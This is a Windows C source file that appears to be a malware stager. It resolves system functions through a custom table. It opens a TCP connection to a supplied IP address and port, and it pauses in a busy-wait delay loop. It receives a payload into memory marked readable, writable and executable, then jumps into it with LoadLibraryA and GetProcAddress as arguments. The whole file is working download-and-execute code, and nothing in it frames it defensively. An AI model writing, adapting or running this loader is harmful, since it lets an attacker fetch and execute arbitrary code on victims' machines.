#include "sys.h"
#include "config.h"
#include "../dispatcher/entrypoint.h"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windef.h>
// #include <stdio.h>

inline static WORD __htons(WORD _short)
{
	return ((_short << 8) | (_short >> 8));
}

#define __ntohs(_short) __htons(_short)

inline static DWORD __htonl(DWORD _long)
{
	return ((_long << 24) | ((_long << 8) & 0x00FF0000)
		| ((_long >> 8) & 0x0000FF00) | ((_long >> 24)));
}

#define __ntohl(_long) __htonl(_long)

#define PAYLOAD_BUFFER_SIZE (0x1000 * 4) // 4 pages

static int GetBinaryCode(SYSTAB *pSysTab, PIN_ADDR pInAddr, WORD wPort, LPBYTE pBuf, DWORD dwSize)
{

	WSADATA wsaData ;
	pSysTab->pfnWSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET sock = pSysTab->pfnWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
	
	struct sockaddr_in addr = { 
		.sin_family = AF_INET,
		.sin_addr = *pInAddr,
		.sin_port = wPort,
	};

	(void)pSysTab->pfnWSAConnect(sock, (struct sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);

	volatile DWORD dummy = 0;
	for (DWORD i = 0; i < 0x5FFFFFFF; i++) // For sleep serival milliseconds
		dummy *= i;

	WSABUF buf = {
		.buf = (PCHAR)pBuf,
		.len = dwSize,
	};

	DWORD dwLen, dwFlag = 0;
	return pSysTab->pfnWSARecv(sock, &buf, 1, &dwLen, &dwFlag, NULL, NULL) || dwLen == PAYLOAD_BUFFER_SIZE;
}


int Load(IN_ADDR InAddr) {
	SYSTAB systab;
	if (InitSysTab(&systab))
		return -1;

	LPVOID pPayload = systab.pfnVirtualAlloc(NULL, PAYLOAD_BUFFER_SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	if (GetBinaryCode(&systab, &InAddr, __htons(CONFIG_BOOT_PORT), pPayload, PAYLOAD_BUFFER_SIZE)) 
		return -1;

	LPDISPATCHER_ENTRYPOINT_PROC pfnEntryPoint = (LPVOID)pPayload;
	return pfnEntryPoint(pPayload, InAddr, systab.pfnLoadLibraryA, systab.pfnGetProcAddress);
}

